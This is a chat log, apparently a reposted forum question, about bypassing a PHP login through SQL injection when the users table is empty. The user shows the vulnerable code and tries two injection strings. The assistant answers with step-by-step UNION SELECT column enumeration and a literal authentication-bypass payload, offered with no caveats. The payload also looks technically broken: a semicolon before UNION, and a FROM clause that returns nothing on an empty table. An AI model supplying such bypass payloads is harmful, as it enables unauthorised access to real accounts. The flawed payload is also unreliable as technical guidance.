User: 请解答这个和日志有关的问题SQL injection to login when there's no record in the database I have a question to solve. Well there's no records of username and password in the database and so one cannot Log in without inserting any records. Is there anyway to exploit the following code and insert records so that we can login.

&lt;?php   
        $con = mysqli_connect("localhost", "root", "pass", "database");
        $username = $_POST["username"];
        $password = $_POST["password"];
        $logged_in = false;
        $query = "SELECT * FROM users WHERE username='$username'";
        $result=mysqli_query($con, $query);
          if(mysqli_num_rows($result) === 1) {
                $row = mysqli_fetch_array($result);
                if($row["password"] === $password){ 
                       $logged_in = true;
                }

        if(!$logged_in)
                echo("Failed to login");
?&gt;


I have tried the following
 username = ' OR 1=1 LIMIT 1 ; INSERT INTO users (username,password) VALUES('user','pass') -- 
 username = ' OR 1=1 LIMIT 1 -- 

Also tell me if there's any other way to exploit the code.

Assistant: This appears to be a case of UNION SELECT rather than inserting your own records.
What you need to do is figure out how many columns are being selected (by trial and error.. SELECT 1,2,3...n until you stop getting an error).

After that, you inject the query so the first part returns false (no username found). The tricky part:
You inject ' OR 1 = 0; UNION SELECT 'banana' AS username, '123456' AS password FROM users LIMIT 1;# into the username field, and into the password field you inject 123456.

You essentially force the SQL query to return any password you want and therefore bypass their conditions :)
